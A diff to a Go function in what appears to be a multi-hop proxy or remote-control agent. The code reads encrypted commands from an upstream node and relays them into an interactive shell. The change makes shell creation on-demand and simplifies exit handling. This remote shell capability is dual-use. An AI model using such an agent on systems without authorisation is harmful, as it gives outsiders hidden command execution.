@@ -526,12 +526,12 @@ func HandleControlConnToUpperNode(controlConnToUpperNode *net.Conn) {
 
 //处理来自上一级节点的控制信道
 func HandleControlConnFromUpperNode(controlConnToUpperNode *net.Conn, NODEID uint32) {
-	var neverexit bool = true
-	var CannotRead = make(chan bool, 1)
-	var GetName = make(chan bool, 1)
-
-	stdout, stdin := CreatInteractiveShell()
-
+	var (
+		CannotRead = make(chan bool, 1)
+		GetName    = make(chan bool, 1)
+		stdin      io.Writer
+		stdout     io.Reader
+	)
 	for {
 		command, err := common.ExtractCommand(*controlConnToUpperNode, AESKey)
 		if err != nil {
@@ -542,19 +542,13 @@ func HandleControlConnFromUpperNode(controlConnToUpperNode *net.Conn, NODEID uin
 			case "SHELL":
 				switch command.Info {
 				case "":
+					stdout, stdin = CreatInteractiveShell()
 					//logrus.Info("Get command to start shell")
-					if neverexit {
-						go func() {
-							StartShell("", stdin, stdout, NODEID)
-						}()
-					} else {
-						go func() {
-							StartShell("\n", stdin, stdout, NODEID)
-						}()
-					}
+					go func() {
+						StartShell("", stdin, stdout, NODEID)
+					}()
 				case "exit\n":
-					neverexit = false
-					continue
+					fallthrough
 				default:
 					go func() {
 						StartShell(command.Info, stdin, stdout, NODEID)
